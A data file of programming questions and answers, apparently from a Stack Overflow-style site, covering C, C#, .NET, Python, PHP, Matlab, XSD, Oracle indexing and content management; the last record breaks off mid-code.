{"title": "How can I initialize an array of pointers to structs?", "description": "Is it possible to initialize an array of pointers to structs?\nSomething like:\nstruct country_t *countries[] = {\n        {\"United States of America\", \"America\"},\n        {\"England\", \"Europe\"},\n        {\"Ethiopia\", \"Africa\"}  \n    }\n\nI want to do that in order to get the entities in not-contiguous memory, and the pointers to them in contiguous memory... But I can't use dynamic memory, so I wonder if it is possible without it.\n", "answer": "Well, your code uses structures rather than pointers to structures.  There are ways to do what you seek, including:\nstatic struct country_t us = { \"United States of America\", \"America\" };\nstatic struct country_t uk = { \"England\",                  \"Europe\"  };\nstatic struct country_t et = { \"Ethiopia\",                 \"Africa\"  };\n\nstruct country_t *countries[] = { &us, &uk, &et, };\n\nThere are other ways to do it with designated initializers and compound literals in C99.  Section 6.5.2.5 'Compound Literals' shows the way:\nstruct country_t *countries[] =\n{\n    &(struct country_t) { \"United States of America\", \"America\" },\n    &(struct country_t) { \"England\",                  \"Europe\"  },\n    &(struct country_t) { \"Ethiopia\",                 \"Africa\"  },\n};\n\nThe standard illustrates pointers to structures with a function call.  Be aware that not all C compilers accept C99 syntax, and these compound literals were not present in C89 (aka C90).\nEdit: Upgraded to use 2-letter ISO 3166 country codes.  Also made the named structures into static variables - those symbols were not visible outside the file before (because they did not exist), and now they aren't visible outside the file after, either.  I debated whether to make anything const and decided not to - but using const when you can is generally a good idea.  Also, in the example, there are 3 countries in 3 continents.  Were you to have multiple countries in a single continent (the norm), you might want to be able to share the continent strings.  However, whether you can do that safely (or at all) depends on the details of the struct country_t (which were not given), and on whether the program is allowed to update the table (which comes back to the const-ness question).\n", "score": 30}
{"title": "OS Compatibility for various .NET Framework versions", "description": "What are the minimum OS requirements for each of the .Net frameworks?  E.g. for which version is it impossible to run each OS on:\n\nWindows 95\nWindows 98\nWindows 98SE\nWindows ME\nWindows NT 3.x\nWindows NT 4\nWindows 2000\n\nI believe all .Net frameworks are compatible w/ XP, Vista, Windows Server 2003, and Windows Server 2008 (please correct me on that if wrong).\n", "answer": "1.x and 2.0 work all the way back to Win98 but stop before Windows 8 (not verified).\n\n.NET Framework 2.0 Supported Operating Systems according to Microsoft:\n\nWindows 98\nWindows ME\nWindows 2000\nWindows XP\nWindows Vista (included with OS)\nWindows Server 2003\nWindows Server 2008 (included with OS)\n\n.NET Framework 3.0 Supported OSs:\n\nWindows XP SP2\nWindows Vista (included with OS)\nWindows 7\nWindows 8\nWindows 2003 Server Service Pack 1 (SP1)\n\nNote: Windows Vista comes with .NET Framework 3.0. Standalone .NET Framework 3.0 packages are not required and not supported on Vista.\n\n.NET Framework 3.5 Supported OSs according to Microsoft:\n\nWindows XP\nWindows Vista\nWindows 7 (included with OS)\nWindows 8 & 8.1 see\nWindows Server 2003\nWindows Server 2008\nWindows Server 2012 & 2012 R2 see\n\n.NET Framework 4.0 Supported OSs according to Microsoft:\n\nWindows XP (but not Starter, Media Center or Tablet editions)\nWindows Vista\nWindows 7\nWindows 8\nWindows 10\nWindows Server 2003\nWindows Server 2008\n\n.NET Framework 4.5 Supported OSs according to Microsoft:\n\nWindows Vista SP2\nWindows 7\nWindows 8 (included with OS)\nWindows 10\nWindows Server 2008 SP2/R2\nWindows Server 2012 (included with OS)\n\n.NET Framework 4.5.1/4.5.2/4.6 Supported OSs according to Microsoft:\n\nWindows Vista SP2\nWindows 7 SP1\nWindows 8 \nWindows 8.1 (included with OS)\nWindows 10 (4.6 included with OS)\nWindows Server 2008 SP2/R2\nWindows Server 2012 (included with OS)\n\n", "score": 109}
{"title": "ASP.NET Regular Expression Validator (Password Strength)", "description": "I have a validation control that has the following expression:\n(?=(.*\\\\d.*){2,})(?=(.*\\\\w.*){2,})(?=(.*\\\\W.*){1,}).{8,}\n\nThat's a password with at least 2 digits, 2 alpha characters, 1 non-alphanumeric and 8 character minimum. Unfortunately this doesn't seem to be cross-browser compliant.\nThis validation works perfectly in Firefox, but it does not in Internet Explorer.\nA combination of each of your answers results in:\nvar format = \"^(?=.{\" + minLength + \",})\" + \n    (minAlpha > 0 ? \"(?=(.*[A-Za-z].*){\" + minAlpha + \",})\" : \"\") + \n    (minNum > 0 ? \"(?=(.*[0-9].*){\" + minNum + \",})\" : \"\") + \n    (minNonAlpha > 0 ? \"(?=(.*\\\\W.*){\" + minNonAlpha + \",})\" : \"\") + \".*$\";\n\nEX: \"^(?=.{x,})(?=(.*[A-Za-z].*){y,})(?=(.*[0-9].*){z,})(?=(.*\\W.*){a,}).*$\"\n\nThe important piece is having the (?.{x,}) for the length first.\n", "answer": "(?=(.*\\W.*){0,}) is not 0 non-alphanumeric characters. It is at least 0 non-alphanumeric characters. If you wanted the password to not contain any non-alphanumeric characters you could do either (?!.*\\W) or (?=\\w*$).\nA simpler solution would be to skip the \\W look-ahead, and use \\w{8,} instead of .{8,}.\nAlso, \\w includes \\d. If you wanted just the alpha you could do either [^\\W\\d] or [A-Za-z].\n/^(?=(?:.*?\\d){2})(?=(?:.*?[A-Za-z]){2})\\w{8,}$/\n\nThis would validate the password to contain at least two digits, two alphas, be at least 8 characters long, and contain only alpha-numeric characters (including underscore).\n\n\\w = [A-Za-z0-9_]\n\\d = [0-9]\n\\s = [ \\t\\n\\r\\f\\v]\n\nEdit:\nTo use this in all browsers you probably need to do something like this:\nvar re = new RegExp(\"^(?=(?:.*?\\\\d){2})(?=(?:.*?[A-Za-z]){2})\\\\w{8,}$\");\nif (re.test(password)) { /* ok */ }\n\nEdit2: The recent update in the question almost invalidates my whole answer. ^^;;\nYou should still be able to use the JavaScript code in the end, if you replace the pattern with what you had originally.\nEdit3: OK. Now I see what you mean.\n/^(?=.*[a-z].*[a-z])(?=.*[0-9].*[0-9]).{3,}/.test(\"password123\") // matches\n/^(?=.*[a-z].*[a-z])(?=.*[0-9].*[0-9]).{4,}/.test(\"password123\") // does not match\n/^(?=.*[a-z].*[a-z]).{4,}/.test(\"password123\")                   // matches\n\nIt seems (?= ) isn't really zero-width in Internet Explorer.\nhttp://development.thatoneplace.net/2008/05/bug-discovered-in-internet-explorer-7.html\nEdit4: More reading: http://blog.stevenlevithan.com/archives/regex-lookahead-bug\nI think this can solve your problem:\n/^(?=.{8,}$)(?=(?:.*?\\d){2})(?=(?:.*?[A-Za-z]){2})(?=(?:.*?\\W){1})/\nnew RegExp(\"^(?=.{8,}$)(?=(?:.*?\\\\d){2})(?=(?:.*?[A-Za-z]){2})(?=(?:.*?\\\\W){1})\")\n\nThe (?=.{8,}$) needs to come first.\n", "score": 15}
{"title": "How do I generate Emma code coverage reports using Ant?", "description": "How do I setup an Ant task to generate Emma code coverage reports?\n", "answer": "To answer questions about where the source and instrumented directories are (these can be switched to whatever your standard directory structure is):\n<property file=\"build.properties\" />\n<property name=\"source\" location=\"src/main/java\" />\n<property name=\"test.source\" location=\"src/test/java\" />\n<property name=\"target.dir\" location=\"target\" />\n<property name=\"target\" location=\"${target.dir}/classes\" />\n<property name=\"test.target\" location=\"${target.dir}/test-classes\" />\n<property name=\"instr.target\" location=\"${target.dir}/instr-classes\" />\n\nClasspaths:\n<path id=\"compile.classpath\">\n  <fileset dir=\"lib/main\">\n    <include name=\"*.jar\" />\n  </fileset>\n</path>\n\n<path id=\"test.compile.classpath\">\n  <path refid=\"compile.classpath\" />\n  <pathelement location=\"lib/test/junit-4.6.jar\" />\n  <pathelement location=\"${target}\" />\n</path>\n\n<path id=\"junit.classpath\">\n  <path refid=\"test.compile.classpath\" />\n  <pathelement location=\"${test.target}\" />\n</path>\n\nFirst you need to setup where Ant can find the Emma libraries:\n<path id=\"emma.lib\" >\n    <pathelement location=\"${emma.dir}/emma.jar\" />\n    <pathelement location=\"${emma.dir}/emma_ant.jar\" />\n</path>\n\nThen import the task:\n<taskdef resource=\"emma_ant.properties\" classpathref=\"emma.lib\" />\n\nThen instrument the code:\n<target name=\"coverage.instrumentation\">\n    <mkdir dir=\"${instr.target}\"/>\n    <mkdir dir=\"${coverage}\"/>\n    <emma>\n        <instr instrpath=\"${target}\" destdir=\"${instr.target}\" metadatafile=\"${coverage}/metadata.emma\" mode=\"copy\">\n            <filter excludes=\"*Test*\"/>\n        </instr>\n    </emma>\n    <!-- Update the that will run the instrumented code -->\n    <path id=\"test.classpath\">\n        <pathelement location=\"${instr.target}\"/>\n        <path refid=\"junit.classpath\"/>\n        <pathelement location=\"${emma.dir}/emma.jar\"/>\n    </path>\n</target>\n\nThen run a target with the proper VM arguments like:\n<jvmarg value=\"-Demma.coverage.out.file=${coverage}/coverage.emma\" />\n<jvmarg value=\"-Demma.coverage.out.merge=true\" />\n\nFinally generate your report:\n<target name=\"coverage.report\" depends=\"coverage.instrumentation\">\n    <emma>\n        <report sourcepath=\"${source}\" depth=\"method\">\n            <fileset dir=\"${coverage}\" >\n                <include name=\"*.emma\" />\n            </fileset>\n            <html outfile=\"${coverage}/coverage.html\" />\n        </report>\n    </emma>\n</target>\n\n", "score": 14}
{"title": "What might cause ThreadAbortException when using HttpWebRequest.GetResponse()", "description": "I'm living in nightmares because of this situation, I have a HttpWebRequest.GetResponse that keeps on giving me a ThreadAbortException, that causes the whole app to go down.\nHow can I avoid that, or at least handle it, would using Thread.ResetAbort() be useful in such a case?\nTo explain more here is a rough code sample:\nHttpWebRequest req = (HttpWebRequest)WebRequest.Create(\"http://someurl.com/\");\nHttpWebResponse resp = req.GetResponse();\n\nnow the last line above throws the ThreadAbortException, it might be because the request timed out which is fine, but I don't want to get a ThreadAbortException inside my ASP.NET 2.0 app because it kills it. The ThreadAborException can't be caught with try/catch, the only way to handle it is using Thread.ResetAbort() which has its own bad effects too, it will keep the thread alive and god only knows for how long.\n", "answer": "From what you say it seems you are making an outgoing WebRequest to an external resource from within the processing of an incoming request to an ASP.NET application.  There are (at least) two timeouts that are relevant here:\n\nWebRequest.Timeout (default 100000ms = 100s) specifies the timeout for execution of the outgoing WebRequest.  If this timeout expires, you should get a WebException - so this isn't your problem.\nThe HttpRuntime that is processing your incoming request has an execution timeout: the default value according to MSDN is 110s for .NET 2.0 or later, 90s for .NET 1.x.  When this timeout expires, you'll get a ThreadAbortException.  It looks like this is what is happening.\n\nIn .NET 1.x, you'd expect this, because the default HttpRuntime executionTimeout is less than WebRequest.Timeout.  In .NET 2.0, you'd expect this with the default timeouts if you have already spent >10s before making the outgoing WebRequest (e.g. if you have more than one outgoing WebRequest from within the same incoming request).\nI would suggest you either:\n\nReduce the WebRequest.Timeout for outgoing requests, and handle WebException, or\nIf the outgoing requests can really take that long, then increase the httpRuntime execution timeout as described in MSDN.\n\n", "score": 12}
{"title": "Read and write from/to a binary file in Matlab", "description": "My knowledge of matlab is merely on a need to know basis, so this is probably an elementary question. Nevertheless here it comes:\nI have got a file containing data (16-bit integers) stored in binary format. How do I read it into a vector /an array in matlab? How do I write this data to a file in matlab? Is there any smart tweak to increase the performance speed when reading/writing a huge amount of data (gigabytes)?\n", "answer": "As Bill the Lizard wrote you can use fread to load the data into a vector.  I just want to expand a little on his answer.  \nReading Data\n>> fid=fopen('data.bin','rb') % opens the file for reading\n>> A = fread(fid, count, 'int16') % reads _count_ elements and stores them in A.\n\nThe commands fopen and fread default to Little-endian[1] encoding for the integers.  If your file is Big-endian encoded you will need to change the fread to\n>> A = fread(fid, count, 'int16', 'ieee-be');\n\nAlso, if you want to read the whole file set \n>> count=inf;\n\nand if you want to read the data into matrix with n columns use\n>> count=[n inf];\n\nWriting Data\nAs for witting the data to a file.  The command, fwrite, in Bill's answer will write to a binary file.  If you want to write the data to a text file you can use dlmwrite\n>> dlmwrite('data.csv',A,',');\n\nReferences\n[1] http://en.wikipedia.org/wiki/Endianness\nUpdate\n\nThe machine format (IE, ieee-be,\nieee-le, vaxd etc.) of the binary data can be specified in either the\nfopen or the fread commands in Matlab.  Details of the supported\nmachine format can be found in\nMatlab's documentation of fopen.  \nScott French's comment to Bill's\nanswer\nsuggests reading the data into an\nint16 variable.  To do this use\n>> A = int16(fread(fid,count,precision,machineFormat));\n\nwhere count is the size/shape of\nthe data to be read, precision is\nthe data format, and machineformat\nis the encoding of each byte.\nSee commands fseek to move around the file.  For example, \n>> fseek(fid,0,'bof');\n\nwill rewind the file to the beginning where bof stands for beginning of file.\n\n", "score": 16}
{"title": "Xsd and inheritance", "description": "I have an xsd like this  \n<xsd:complexType name=\"A\">  \n        <xsd:complexContent>  \n            <xsd:sequence>  \n                <xsd:element name=\"options\">  \n                    <xsd:complexType>  \n                        <xsd:sequence>  \n                            <xsd:element name=\"Day\">  \n                            ...  \n                            </xsd:element>  \n                        </xsd:sequence>  \n                    </xsd:complexType>  \n                </xsd:element>  \n            </xsd:sequence>  \n        </xsd:complexContent>  \n</xsd:complexType>  \n\n<xsd:complexType name=\"B\">  \n    <xsd:complexContent>\n        <xsd:extension base=\"A\">\n        ...What would go here...\n        </xsd:extension>\n    </xsd:complexContent>\n</xsd:complexType>  \n\nSo basically I want class A to have a sequence of options (Day, Week for example) then I want B to inherit from A and have all of A's options and an additional 2 or 3 options like hours, seconds.\n", "answer": "Here's the schema I came up with:\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<xs:schema id=\"inheritance\"\n    targetNamespace=\"http://test.com\"\n    elementFormDefault=\"qualified\"\n    xmlns=\"http://www.w3.org/2001/XMLSchema\"\n    xmlns:test=\"http://test.com\"\n>\n    <xs:element name=\"Time\">\n        <xs:complexType>\n            <xs:sequence>\n                <xs:element name=\"First\" type=\"test:A\" />\n                <xs:element name=\"Second\" type=\"test:B\" />\n            </xs:sequence>\n        </xs:complexType>\n    </xs:element>\n\n    <xs:complexType name=\"shortOptions\">\n        <xs:sequence>\n            <xs:element name=\"Day\" />\n        </xs:sequence>\n    </xs:complexType>\n\n    <xs:complexType name=\"longOptions\">\n        <xs:complexContent>\n            <xs:extension base=\"test:shortOptions\">\n                <xs:sequence>\n                    <xs:element name=\"Week\" />\n                </xs:sequence>\n            </xs:extension>\n        </xs:complexContent>\n    </xs:complexType>\n\n    <xs:complexType name=\"A\">\n        <xs:sequence>\n            <xs:element name=\"options\" type=\"test:shortOptions\" />\n        </xs:sequence>\n    </xs:complexType>\n\n    <xs:complexType name=\"B\">\n        <xs:sequence>\n            <xs:element name=\"options\" type=\"test:longOptions\" />\n        </xs:sequence>\n    </xs:complexType>\n\n</xs:schema>\n\nWhich seems to fit this xml:\n<?xml version=\"1.0\" encoding=\"utf-8\" ?>\n<Time xmlns=\"http://test.com\">\n    <First>\n        <options>\n            <Day>Today</Day>\n        </options>\n    </First>\n    <Second>\n        <options>\n            <Day>Tomorrow</Day>\n            <Week>This Week</Week>\n        </options>\n    </Second>\n</Time>\n\n", "score": 38}
{"title": "Howto do python command-line autocompletion but NOT only at the beginning of a string", "description": "Python, through it's readline bindings allows for great command-line autocompletion (as described in here).\nBut, the completion only seems to work at the beginning of strings.  If you want to match the middle or end of a string readline doesn't work.\nI would like to autocomplete strings, in a command-line python program by matching what I type with any of the strings in a list of available strings.  \n\nA good example of the type of autocompletion I would like to have is the type that happens in GMail when you type in the To field.  If you type one of your contacts' last name, it will come up just as well as if you typed her first name.  \nSome use of the up and down arrows or some other method to select from the matched strings may be needed (and not needed in the case of readline) and that is fine in my case.\nMy particular use case is a command-line program that sends emails.\nSpecific code examples would be very helpful.\n\nUsing terminal emulators like curses would be fine.  It only has to run on linux, not Mac or Windows.\nHere is an example:\nSay I have the following three strings in a list \n['Paul Eden <paul@domain.com>', \n'Eden Jones <ejones@domain.com>', \n'Somebody Else <somebody@domain.com>']\n\nI would like some code that will autocomplete the first two items in the list after I type 'Eden' and then allow me to pick one of them (all through the command-line using the keyboard).\n", "answer": "I'm not sure I understand the problem.  You could use readline.clear_history and readline.add_history to set up the completable strings you want, then control-r to search backword in the history (just as if you were at a shell prompt).  For example:\n#!/usr/bin/env python\n\nimport readline\n\nreadline.clear_history()\nreadline.add_history('foo')\nreadline.add_history('bar')\n\nwhile 1:\n    print raw_input('> ')\n\nAlternatively, you could write your own completer version and bind the appropriate key to it.  This version uses caching in case your match list is huge:\n#!/usr/bin/env python\n\nimport readline\n\nvalues = ['Paul Eden <paul@domain.com>', \n          'Eden Jones <ejones@domain.com>', \n          'Somebody Else <somebody@domain.com>']\ncompletions = {}\n\ndef completer(text, state):\n    try:\n        matches = completions[text]\n    except KeyError:\n        matches = [value for value in values\n                   if text.upper() in value.upper()]\n        completions[text] = matches\n    try:\n        return matches[state]\n    except IndexError:\n        return None\n\nreadline.set_completer(completer)\nreadline.parse_and_bind('tab: menu-complete')\n\nwhile 1:\n    a = raw_input('> ')\n    print 'said:', a\n\n", "score": 10}
{"title": "PHP Dynamic Pagination Without SQL", "description": "I've got a script that dynamically calls and displays images from a directory, what would be the best way to paginate this?  I'd like to be able to control the number of images that are displayed per page through a variable within the script.  I'm thinking of using URL varriables (ie - http://domain.com/page.php?page=1) but am unsure how to go about this.\nThanks for the help.\n", "answer": "This is a function I often use to do pagination. Hope it helps.\nfunction paginate($page, $total, $per_page) {\n    if(!is_numeric($page)) { $page = 1; }\n    if(!is_numeric($per_page)) { $per_page = 10; }\n    if($page > ceil($total / $per_page)) $page = 1;\n    if($page == \"\" || $page == 0) { \n        $page = 1;\n        $start = 0;\n        $end = $per_page;\n    } else {\n        $start = ($page * $per_page) - ($per_page);\n        $end = $per_page;\n    }\n\n    $prev_page = \"\";\n    $next_page = \"\";\n    $all_pages = array();\n    $selected = \"\";\n    $enabled = false;\n\n    if($total > $per_page) {\n        $enabled = true;\n        $prev = $page - 1;\n        $prev_page = ($prev == 0) ? 0 : $prev;\n\n        $next = $page + 1;\n        $total_pages = ceil($total/$per_page);\n\n        $next_page = ($next <= $total_pages) ? $next : 0;\n\n        for($x=1;$x<=$total_pages;$x++) {\n            $all_pages[] = $x;\n            $selected = ($x == $page) ? $x : $selected; \n        }\n    }\n\n    return array(\n        \"per_page\" => $per_page,\n        \"page\" => $page,\n        \"prev_page\" => $prev_page,\n        \"all_pages\" => $all_pages,\n        \"next_page\" => $next_page,\n        \"selected\" => $selected,\n        \"start\" => $start,\n        \"end\" => $end,\n        \"enabled\" => $enabled\n    );\n}\n\n// ex: we are in page 2, we have 50 items, and we're showing 10 per page\nprint_r(paginate(2, 50, 10));\n\nThis will return:\nArray\n(\n    [per_page] => 10\n    [page] => 2\n    [prev_page] => 1\n    [all_pages] => Array\n        (\n            [0] => 1\n            [1] => 2\n            [2] => 3\n            [3] => 4\n            [4] => 5\n        )\n    [next_page] => 3\n    [selected] => 2\n    [start] => 10\n    [end] => 10\n    [enabled] => 1\n)\n\nWith all that data you are then pretty well armed to make the pagination links.\n", "score": 10}
{"title": "networking in .net/C#", "description": "Could somebody please point me in the right direction for learning how to do networking in C#/.net 3.5? Code samples and explanations are welcome. Basically I am looking for how to do asynchronous/multithreaded server/client models.\nI am fairly comfortable with the basics in how to accomplish this in C++ with WinSock but though all of my research cannot seem to grasp this concept in C#.\nThanks for any assistance you can provide :)\n", "answer": "If WCF meets your needs, it's worth looking at. ZeroC  and other alternative higher level libraries exist. Otherwise there are several different ways to work closer to the socket level if that's what you need.\nTcpClient/UdpClient\nThese provide a relatively thin wrapper around the underlying sockets. It essentially provides a Stream over the socket. You can use the async methods on the NetworkStream (BeginRead, etc.). I don't like this one as the wrapper doesn't provide that much and it tends to be a little more awkward than using the socket directly.\nSocket - Select\nThis provides the classic Select technique for multiplexing multiple socket IO onto a single thread. Not recommended any longer.\nSocket - APM Style\nThe Asynchronous Programming Model (AKA IAsyncResult, Begin/End Style) for sockets is the primary technique for using sockets asynchronously. And there are several variants. Essentially, you call an async method (e.g., BeginReceive) and do one of the following:\n\nPoll for completion on the returned IAsyncResult (hardly used).\nUse the WaitHandle from the IAsyncResult to wait for the method to complete.\nPass the BeginXXX method a callback method that will be executed when the method completes.\n\nThe best way is #3 as it is the usually the most convenient. When in doubt, use this method.\nSome links:\n\nMSDN Magazine Article on Sockets\nA Jeffery Richter Article on the Asynchronous Programming Model\n\n.NET 3.5 High Performance Sockets\n.NET 3.5 introduced a new model for async sockets that uses events. It uses the \"simplified\" async model (e.g., Socket.SendAsync). Instead of giving a callback, you subscribe to an event for completion and instead of an IAsyncResult, you get SocketAsyncEventArgs. The idea is that you can reuse the SocketAsyncEventArgs and pre-allocate memory for socket IO. In high performance scenarios this can be much more efficient that using the APM style. In addition, if you do pre-allocate the memory, you get a stable memory footprint, reduced garbage collection, memory holes from pinning etc. Note that worrying about this should only be a consideration in the most high performance scenarios.\n\nMSDN Magazine: Get Connected With The .NET Framework 3.5\nMSDN Information with technique for pre-allocating memory\n\nSummary\nFor most cases use the callback method of the APM style unless you prefer the style of the SocketAsyncEventArgs / Async method. If you've used CompletionPorts in WinSock, you should know that both of these methods use CompletionPorts under the hood.\n", "score": 16}
{"title": "C# file management", "description": "How can I detect in C# whether two files are absolutely identical (size, content, etc.)?\n", "answer": "Here's a simple solution, which just reads both files and compares the data. It should be no slower than the hash method, since both methods will have to read the entire file. EDIT As noted by others, this implementation is actually somewhat slower than the hash method, because of its simplicity. See below for a faster method.\nstatic bool FilesAreEqual( string f1, string f2 )\n{\n    // get file length and make sure lengths are identical\n    long length = new FileInfo( f1 ).Length;\n    if( length != new FileInfo( f2 ).Length )\n        return false;\n\n    // open both for reading\n    using( FileStream stream1 = File.OpenRead( f1 ) )\n    using( FileStream stream2 = File.OpenRead( f2 ) )\n    {\n        // compare content for equality\n        int b1, b2;\n        while( length-- > 0 )\n        {\n            b1 = stream1.ReadByte();\n            b2 = stream2.ReadByte();\n            if( b1 != b2 )\n                return false;\n        }\n    }\n\n    return true;\n}\n\nYou could modify it to read more than one byte at a time, but the internal file stream should already be buffering the data, so even this simple code should be relatively fast.\nEDIT Thanks for the feedback on speed here. I still maintain that the compare-all-bytes method can be just as fast as the MD5 method, since both methods have to read the entire file. I would suspect (but don't know for sure) that once the files have been read, the compare-all-bytes method requires less actual computation. In any case, I duplicated your performance observations for my initial implementation, but when I added some simple buffering, the compare-all-bytes method was just as fast. Below is the buffering implementation, feel free to comment further!\nEDIT Jon B makes another good point: in the case where the files actually are different, this method can stop as soon as it finds the first different byte, whereas the hash method has to read the entirety of both files in every case.\nstatic bool FilesAreEqualFaster( string f1, string f2 )\n{\n    // get file length and make sure lengths are identical\n    long length = new FileInfo( f1 ).Length;\n    if( length != new FileInfo( f2 ).Length )\n        return false;\n\n    byte[] buf1 = new byte[4096];\n    byte[] buf2 = new byte[4096];\n\n    // open both for reading\n    using( FileStream stream1 = File.OpenRead( f1 ) )\n    using( FileStream stream2 = File.OpenRead( f2 ) )\n    {\n        // compare content for equality\n        int b1, b2;\n        while( length > 0 )\n        {\n            // figure out how much to read\n            int toRead = buf1.Length;\n            if( toRead > length )\n                toRead = (int)length;\n            length -= toRead;\n\n            // read a chunk from each and compare\n            b1 = stream1.Read( buf1, 0, toRead );\n            b2 = stream2.Read( buf2, 0, toRead );\n            for( int i = 0; i < toRead; ++i )\n                if( buf1[i] != buf2[i] )\n                    return false;\n        }\n    }\n\n    return true;\n}\n\n", "score": 30}
{"title": "Can a recursive function be inline?", "description": "inline int factorial(int n)\n{\n    if(!n) return 1;\n    else return n*factorial(n-1);\n}\n\nAs I was reading this, found that the above code would lead to \"infinite compilation\" if not handled by compiler correctly.\nHow does the compiler decide whether to inline a function or not ?\n", "answer": "First, the inline specification on a function is just a hint.  The compiler can (and often does) completely ignore the presence or absence of an inline qualifier.  With that said, a compiler can inline a recursive function, much as it can unroll an infinite loop.  It simply has to place a limit on the level to which it will \"unroll\" the function.\nAn optimizing compiler might turn this code:\ninline int factorial(int n)\n{\n    if (n <= 1)\n    {\n        return 1;\n    }\n    else\n    {\n        return n * factorial(n - 1);\n    }\n}\n\nint f(int x)\n{\n    return factorial(x);\n}\n\ninto this code:\nint factorial(int n)\n{\n    if (n <= 1)\n    {\n        return 1;\n    }\n    else\n    {\n        return n * factorial(n - 1);\n    }\n}\n\nint f(int x)\n{\n    if (x <= 1)\n    {\n        return 1;\n    }\n    else\n    {\n        int x2 = x - 1;\n        if (x2 <= 1)\n        {\n            return x * 1;\n        }\n        else\n        {\n            int x3 = x2 - 1;\n            if (x3 <= 1)\n            {\n                return x * x2 * 1;\n            }\n            else\n            {\n                return x * x2 * x3 * factorial(x3 - 1);\n            }\n        }\n    }\n}\n\nIn this case, we've basically inlined the function 3 times.  Some compilers do perform this optimization.  I recall MSVC++ having a setting to tune the level of inlining that would be performed on recursive functions (up to 20, I believe).\n", "score": 157}
{"title": "How to choose and optimize oracle indexes?", "description": "I would like to know if there are general rules for creating an index or not.\nHow do I choose which fields I should include in this index or when not to include them?\nI know its always depends on the environment and the amount of data, but I was wondering if we could make some globally accepted rules about making indexes in Oracle.\n", "answer": "The Oracle documentation has an excellent set of considerations for indexing choices: http://download.oracle.com/docs/cd/B28359_01/server.111/b28274/data_acc.htm#PFGRF004\nUpdate for 19c: https://docs.oracle.com/en/database/oracle/oracle-database/19/tgdba/designing-and-developing-for-performance.html#GUID-99A7FD1B-CEFD-4E91-9486-2CBBFC2B7A1D\nQuoting:\n\nConsider indexing keys that are used frequently in WHERE clauses.\n\nConsider indexing keys that are used frequently to join tables in SQL statements. For more information on optimizing joins, see the section \"Using Hash Clusters for Performance\".\n\nChoose index keys that have high selectivity. The selectivity of an index is the percentage of rows in a table having the same value for the indexed key. An index's selectivity is optimal if few rows have the same value. Note: Oracle automatically creates indexes, or uses existing indexes, on the keys and expressions of unique and primary keys that you define with integrity constraints.\nIndexing low selectivity columns can be helpful if the data distribution is skewed so that one or two values occur much less often than other values.\n\nDo not use standard B-tree indexes on keys or expressions with few distinct values. Such keys or expressions usually have poor selectivity and therefore do not optimize performance unless the frequently selected key values appear less frequently than the other key values. You can use bitmap indexes effectively in such cases, unless the index is modified frequently, as in a high concurrency OLTP application.\n\nDo not index columns that are modified frequently. UPDATE statements that modify indexed columns and INSERT and DELETE statements that modify indexed tables take longer than if there were no index. Such SQL statements must modify data in indexes as well as data in tables. They also generate additional undo and redo.\n\nDo not index keys that appear only in WHERE clauses with functions or operators. A WHERE clause that uses a function, other than MIN or MAX, or an operator with an indexed key does not make available the access path that uses the index except with function-based indexes.\n\nConsider indexing foreign keys of referential integrity constraints in cases in which a large number of concurrent INSERT, UPDATE, and DELETE statements access the parent and child tables. Such an index allows UPDATEs and DELETEs on the parent table without share locking the child table.\n\nWhen choosing to index a key, consider whether the performance gain for queries is worth the performance loss for INSERTs, UPDATEs, and DELETEs and the use of the space required to store the index. You might want to experiment by comparing the processing times of the SQL statements with and without indexes. You can measure processing time with the SQL trace facility.\n\n", "score": 57}
{"title": "How to define Content Management", "description": "First some background. I recently went for an interview and some of the questions asked to me was about Enterprise Content Management. Obviously, I did not have any experience and did not get the offer. \nBut, it increased my curiosity and tried Internet to get some info on the topic. Wikipedia made me more confused with even more buzzwords. Most of the stuff on the web is marketing related and relevant to specific products like Sharepoint or Drupal etc.\nI need some help in understanding more about the topic or the domain in simpler terms. What is the requirement to use it? What kind of companies use it? What are the problem areas it tries to address? Any popular use cases? Any places where it looks like a good fit but it is not actually?\nLastly, any good book or articles on the topic without being specific to any product?\n", "answer": "The domain is vast and is not easy to cover it with a short answer. According to Gartner (which IMHO gives very good definitions, see links):\n\nEnterprise Content Management (ECM) is\n  an “umbrella term” and represents a\n  vision and framework for integrating a\n  broad range of content management\n  technologies and content formats.\n\nMoreover, Gartner defines ECM suites as encompassing the following core components:\n\nDocument Management for check-in/check-out, version control,\n  security and library services for\n  business documents.\nDocument Imaging for capturing, transforming and managing paper\n  documents.\nRecords Management for long-term archiving, automation of retention and\n  compliance policies, and ensuring\n  legal, regulatory and industry\n  compliance.\nWorkflow for supporting business processes, routing content, assigning\n  work tasks and states, and creating\n  audit trails.\nWeb Content Management for automating the Webmaster function and\n  managing dynamic content and user interaction.\nDocument-Centric Collaboration for document sharing and supporting project teams.\n\nArticles:\n\nThe Forrester Wave: Enterprise Content Management Suites, Q4 2007\nGartner Magic Quadrant for Enterprise Content Management, 2007\n\n", "score": 11}
{"title": "Python embedded in CPP: how to get data back to CPP", "description": "While working on a C++ project, I was looking for a third party library for something that is not my core business. I found a really good library, doing exactly what's needed, but it is written in Python. I decided to experiment with embedding Python code in C++, using the Boost.Python library.\nThe C++ code looks something like this:\n#include <string>\n#include <iostream>\n#include <boost/python.hpp>\n\nusing namespace boost::python;\n\nint main(int, char **) \n{\n    Py_Initialize();\n\n    try \n    {\n        object module((handle<>(borrowed(PyImport_AddModule(\"__main__\")))));\n\n        object name_space = module.attr(\"__dict__\");\n        object ignored = exec(\"from myModule import MyFunc\\n\"\n                          \"MyFunc(\\\"some_arg\\\")\\n\",\n                          name_space);\n\n        std::string res = extract<std::string>(name_space[\"result\"]);\n    } \n    catch (error_already_set) \n    {\n        PyErr_Print();\n    }\n\n    Py_Finalize();\n    return 0;\n}\n\nA (very) simplified version of the Python code looks like this:\nimport thirdparty\n\ndef MyFunc(some_arg):\n    result = thirdparty.go()\n    print result\n\nNow the problem is this: \n'MyFunc' executes fine, i can see the print of 'result'.\nWhat i cannot do is read 'result' back from the C++ code. The extract command never finds 'result' in any namespace.\nI tried defining 'result' as a global, i even tried returning a tuple, but i cannot get it to work.\n", "answer": "First of all, change your function to return the value. printing it will complicate things since you want to get the value back. Suppose your MyModule.py looks like this:\nimport thirdparty\n\ndef MyFunc(some_arg):\n    result = thirdparty.go()\n    return result\n\nNow, to do what you want, you have to go beyond basic embedding, as the documentation says. Here is the full code to run your function:\n#include <Python.h>\n\nint\nmain(int argc, char *argv[])\n{\n    PyObject *pName, *pModule, *pFunc;\n    PyObject *pArgs, *pArg, *pResult;\n    int i;\n\n    Py_Initialize();\n    pName = PyString_FromString(\"MyModule.py\");\n    /* Error checking of pName left out as exercise */\n\n    pModule = 